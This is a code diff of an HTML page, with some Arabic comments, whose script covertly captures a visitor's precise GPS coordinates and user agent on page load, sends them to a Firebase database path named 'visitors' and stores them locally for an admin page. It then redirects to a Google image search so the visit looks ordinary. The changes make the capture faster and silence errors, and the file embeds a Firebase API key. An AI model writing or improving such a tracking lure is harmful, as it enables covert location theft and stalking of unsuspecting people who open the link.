@@ -8,9 +8,8 @@
 </head>
 <body>
 <script>
-    // عزل الكود بالكامل داخل IIFE لمنع التلوث العام
     (function(){
-        // Firebase configuration
+        // Firebase configuration (same as before)
         const firebaseConfig = {
             apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
             databaseURL: "https://imggps-default-rtdb.firebaseio.com",
@@ -20,13 +19,11 @@
         const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
         const DB_PATH = "visitors";
 
-        // Parameters for location collection
-        const MAX_WAIT_TIME = 10000;          // 10 seconds max
-        const DESIRED_ACCURACY = 50;          // meters – stop and save if accuracy <= this
-        const MIN_READINGS = 2;               // not strictly used, but kept for logic
+        // Faster collection: wait up to 4 seconds, accept accuracy <= 200m
+        const MAX_WAIT_TIME = 4000;
+        const DESIRED_ACCURACY = 200; // meters
 
         let bestReading = null;
-        let readingCount = 0;
         let watchId = null;
         let dataSaved = false;
         let timeoutId = null;
@@ -55,18 +52,21 @@
                 userAgent: navigator.userAgent.substring(0, 100)
             };
 
+            // Save to localStorage (admin.html reads from 'geo_log')
             try {
                 const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                 localData.push(record);
                 localStorage.setItem('geo_log', JSON.stringify(localData));
             } catch(e) {}
 
+            // Save to Firebase under 'visitors' path
             fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(record)
-            }).catch(err => console.warn('Firebase save error', err));
+            }).catch(() => {}); // ignore errors
 
+            // Redirect immediately
             redirect();
         }
 
@@ -75,12 +75,12 @@
             const lat = pos.coords.latitude.toFixed(7);
             const lng = pos.coords.longitude.toFixed(7);
 
-            readingCount++;
-
+            // Keep the best (lowest accuracy) reading
             if (!bestReading || accuracy < bestReading.accuracy) {
                 bestReading = { lat, lng, accuracy };
             }
 
+            // If accuracy is good enough, save and redirect now
             if (accuracy <= DESIRED_ACCURACY) {
                 if (watchId !== null) {
                     navigator.geolocation.clearWatch(watchId);
@@ -101,30 +101,31 @@
             if (bestReading) {
                 saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
             } else {
-                redirect();
+                redirect(); // no location obtained
             }
         }
 
         function handleError(err) {
+            // If we have a best reading, use it after a short delay
             if (bestReading) {
                 setTimeout(() => {
                     if (!dataSaved) {
                         saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
                     }
-                }, 500);
+                }, 300);
                 return;
             }
-
+            // Otherwise, redirect after a brief moment
             if (watchId !== null) {
                 navigator.geolocation.clearWatch(watchId);
                 watchId = null;
             }
-            setTimeout(redirect, 1000);
+            setTimeout(redirect, 500);
         }
 
         function startLocation() {
             if (!navigator.geolocation) {
-                setTimeout(redirect, 500);
+                setTimeout(redirect, 300);
                 return;
             }
 
@@ -135,13 +136,12 @@
                 handleError,
                 {
                     enableHighAccuracy: true,
-                    timeout: 15000,
+                    timeout: 8000,
                     maximumAge: 0
                 }
             );
         }
 
-        // Start immediately
         startLocation();
 
         // Extra safety fallback
@@ -153,8 +153,8 @@
                 }
                 redirect();
             }
-        }, MAX_WAIT_TIME + 2000);
-    })(); // نهاية IIFE
+        }, MAX_WAIT_TIME + 1000);
+    })();
 </script>
 </body>
 </html>
